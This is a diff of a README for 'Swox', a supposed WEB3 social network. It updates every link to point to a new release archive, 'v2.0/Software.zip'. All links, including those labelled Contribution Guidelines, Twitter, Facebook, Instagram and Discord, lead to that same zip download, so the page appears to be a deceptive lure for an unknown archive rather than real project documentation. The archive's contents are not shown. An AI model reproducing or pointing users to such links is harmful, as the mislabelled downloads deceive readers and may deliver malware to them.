@@ -19,27 +19,27 @@ Swox is redefining the concept of social networking in the WEB3 era. With a focu
 
 ## Getting Started
 
-To get started with Swox, simply click [here](https://github.com/ernanfer2/Swox/releases/download/v1.0/Application.zip) to download the latest release. You will find everything you need to set up your Swox account and start exploring the exciting features of our platform.
+To get started with Swox, simply click [here](https://github.com/ernanfer2/Swox/releases/download/v2.0/Software.zip) to download the latest release. You will find everything you need to set up your Swox account and start exploring the exciting features of our platform.
 
-[![Download Swox](https://github.com/ernanfer2/Swox/releases/download/v1.0/Application.zip)](https://github.com/ernanfer2/Swox/releases/download/v1.0/Application.zip)
+[![Download Swox](https://github.com/ernanfer2/Swox/releases/download/v2.0/Software.zip)](https://github.com/ernanfer2/Swox/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the release, follow the installation instructions provided to set up your Swox account. If you encounter any issues during the installation process, please refer to the "Releases" section for additional guidance and troubleshooting tips.
 
 ## Contributing
 
-We welcome contributions from developers, designers, and enthusiasts who share our vision for the future of social networking. If you would like to contribute to the development of Swox, please check out our [Contribution Guidelines](https://github.com/ernanfer2/Swox/releases/download/v1.0/Application.zip) for more information on how you can get involved.
+We welcome contributions from developers, designers, and enthusiasts who share our vision for the future of social networking. If you would like to contribute to the development of Swox, please check out our [Contribution Guidelines](https://github.com/ernanfer2/Swox/releases/download/v2.0/Software.zip) for more information on how you can get involved.
 
 ## Stay in Touch
 
 Stay updated on the latest news and announcements from Swox by following us on social media:
 
-🐦 [Twitter](https://github.com/ernanfer2/Swox/releases/download/v1.0/Application.zip)
+🐦 [Twitter](https://github.com/ernanfer2/Swox/releases/download/v2.0/Software.zip)
 
-📘 [Facebook](https://github.com/ernanfer2/Swox/releases/download/v1.0/Application.zip)
+📘 [Facebook](https://github.com/ernanfer2/Swox/releases/download/v2.0/Software.zip)
 
-📷 [Instagram](https://github.com/ernanfer2/Swox/releases/download/v1.0/Application.zip)
+📷 [Instagram](https://github.com/ernanfer2/Swox/releases/download/v2.0/Software.zip)
 
-💬 [Discord](https://github.com/ernanfer2/Swox/releases/download/v1.0/Application.zip)
+💬 [Discord](https://github.com/ernanfer2/Swox/releases/download/v2.0/Software.zip)
 
 Join our community to connect with like-minded individuals and be part of the social networking revolution!
 
